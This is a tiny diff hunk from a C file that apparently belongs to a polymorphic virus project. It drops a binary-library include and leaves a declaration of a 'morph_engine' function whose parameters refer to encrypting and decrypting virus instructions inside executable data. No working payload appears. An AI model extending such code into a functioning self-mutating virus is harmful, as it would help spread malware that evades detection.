@@ -4,7 +4,7 @@
 #include <time.h>
 #include <string.h>
 #include <unistd.h>
-#include <bfd.h>
+
 
 extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 
